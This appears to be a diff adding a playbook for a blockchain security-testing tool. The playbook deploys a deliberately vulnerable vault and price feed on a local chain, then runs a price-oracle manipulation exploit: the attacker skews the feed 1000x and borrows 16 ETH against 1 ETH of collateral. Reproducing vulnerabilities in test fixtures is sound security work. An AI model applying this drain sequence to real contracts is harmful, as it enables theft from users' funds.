@@ -1,0 +1,191 @@
+# End-to-end replay of the naive-oracle-vault corpus fixture (BTV-L2-003,
+# manipulable price oracle — the Mango Markets / Euler exploit shape):
+#
+#   boot chain -> deploy fixture -> map oracle deps from bytecode ->
+#   execute the exploit on-chain via cast -> verify attacker profit ->
+#   reproduce with a forge PoC test
+#
+# Run from the repo root:
+#   bin/blocktack campaign \
+#     --target corpus/fixtures/naive-oracle-vault/target.yaml \
+#     --playbook playbooks/evm/naive-oracle-vault.yaml
+apiVersion: blocktack/v1
+kind: Playbook
+name: naive-oracle-vault-replay
+description: >
+  Full-stack replay of a manipulable-oracle vulnerability: the campaign
+  deploys the fixture on a local chain, discovers the oracle dependency
+  from deployed bytecode, executes the price-skew attack on-chain, and
+  verifies attacker profit — then cross-checks with a forge PoC test.
+target:
+  chainTypes: [evm]
+  layers: [L2]
+steps:
+  - id: env-up
+    name: Start local anvil node
+    tactic: setup
+    run:
+      type: shell
+      command: anvil
+      args: ["--port", "8545"]
+      background: true
+
+  - id: wait-for-rpc
+    name: Wait for the RPC endpoint to accept requests
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          for i in $(seq 1 50); do
+            cast block-number --rpc-url http://127.0.0.1:8545 >/dev/null 2>&1 && exit 0
+            sleep 0.2
+          done
+          echo "anvil did not come up" >&2
+          exit 1
+
+  - id: identify-chain
+    name: Fingerprint the chain via the engine
+    tactic: discover
+    run:
+      type: engine
+      engine: blocktack-evm
+      action: fingerprint
+
+  - id: deploy-feed
+    name: Deploy the manipulable price feed
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          KEY0="$(awk '/Private Keys/{p=1;next} p && /^\(0\)/{print $2; exit}' "$BLOCKTACK_OUT_DIR/steps/env-up.log")"
+          forge create --broadcast \
+            --root corpus/fixtures/naive-oracle-vault \
+            src/MockPriceFeed.sol:MockPriceFeed \
+            --rpc-url http://127.0.0.1:8545 \
+            --private-key "$KEY0"
+
+  - id: deploy-vault
+    name: Deploy the naive oracle vault
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          KEY0="$(awk '/Private Keys/{p=1;next} p && /^\(0\)/{print $2; exit}' "$BLOCKTACK_OUT_DIR/steps/env-up.log")"
+          FEED="$(grep -m1 'Deployed to:' "$BLOCKTACK_OUT_DIR/steps/deploy-feed.log" | grep -oE '0x[0-9a-fA-F]{40}')"
+          forge create --broadcast \
+            --root corpus/fixtures/naive-oracle-vault \
+            src/NaiveOracleVault.sol:NaiveOracleVault \
+            --rpc-url http://127.0.0.1:8545 \
+            --private-key "$KEY0" \
+            --constructor-args "$FEED"
+
+  - id: map-oracles
+    name: Map oracle dependencies from deployed bytecode
+    tactic: discover
+    run:
+      type: engine
+      engine: blocktack-evm
+      action: map-oracles
+      options:
+        addresses: ["0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512"]
+
+  - id: static-pass
+    name: Static analysis of fixture sources (Slither)
+    tactic: discover
+    run:
+      type: adapter
+      adapter: slither
+
+  - id: fund-vault
+    name: Seed the vault with victim funds
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          KEY2="$(awk '/Private Keys/{p=1;next} p && /^\(2\)/{print $2; exit}' "$BLOCKTACK_OUT_DIR/steps/env-up.log")"
+          VAULT="$(grep -m1 'Deployed to:' "$BLOCKTACK_OUT_DIR/steps/deploy-vault.log" | grep -oE '0x[0-9a-fA-F]{40}')"
+          cast send "$VAULT" --value 20ether \
+            --rpc-url http://127.0.0.1:8545 --private-key "$KEY2"
+
+  - id: attacker-deposit
+    name: Attacker deposits 1 ETH of collateral
+    tactic: exploit
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          KEY1="$(awk '/Private Keys/{p=1;next} p && /^\(1\)/{print $2; exit}' "$BLOCKTACK_OUT_DIR/steps/env-up.log")"
+          VAULT="$(grep -m1 'Deployed to:' "$BLOCKTACK_OUT_DIR/steps/deploy-vault.log" | grep -oE '0x[0-9a-fA-F]{40}')"
+          cast send "$VAULT" "deposit()" --value 1ether \
+            --rpc-url http://127.0.0.1:8545 --private-key "$KEY1"
+
+  - id: skew-oracle
+    name: Skew the price feed 1000x
+    tactic: exploit
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          KEY1="$(awk '/Private Keys/{p=1;next} p && /^\(1\)/{print $2; exit}' "$BLOCKTACK_OUT_DIR/steps/env-up.log")"
+          FEED="$(grep -m1 'Deployed to:' "$BLOCKTACK_OUT_DIR/steps/deploy-feed.log" | grep -oE '0x[0-9a-fA-F]{40}')"
+          cast send "$FEED" "setPrice(int256)" 200000000000000 \
+            --rpc-url http://127.0.0.1:8545 --private-key "$KEY1"
+
+  - id: drain-vault
+    name: Borrow 16 ETH against 1 ETH of inflated collateral
+    tactic: exploit
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          KEY1="$(awk '/Private Keys/{p=1;next} p && /^\(1\)/{print $2; exit}' "$BLOCKTACK_OUT_DIR/steps/env-up.log")"
+          VAULT="$(grep -m1 'Deployed to:' "$BLOCKTACK_OUT_DIR/steps/deploy-vault.log" | grep -oE '0x[0-9a-fA-F]{40}')"
+          cast send "$VAULT" "borrow(uint256)" 16000000000000000000 \
+            --rpc-url http://127.0.0.1:8545 --private-key "$KEY1"
+
+  - id: verify-pnl
+    name: Verify attacker profit via balance delta
+    tactic: verify
+    run:
+      type: engine
+      engine: blocktack-evm
+      action: verify-pnl
+      options:
+        attacker: "0x70997970C51812dc3A010C7d01b50e0d17dc79C8" # anvil account 1
+        blocksAgo: 6
+
+  - id: forge-poc
+    name: Reproduce the exploit with a forge PoC test
+    tactic: verify
+    run:
+      type: adapter
+      adapter: foundry
+      options:
+        sourceDir: corpus/fixtures/naive-oracle-vault
+        weakness: BTV-L2-003
+
+verification:
+  - id: oracle-mapped
+    expects: map-oracles flags a latestAnswer() dependency on the vault (BTV-L2-003)
+  - id: onchain-drain
+    expects: verify-pnl records a critical finding — attacker gained ~15 ETH on the local chain
+  - id: poc-confirmed
+    expects: the foundry adapter records a confirmed critical finding for test_poc_oracle_manipulation_drains_vault
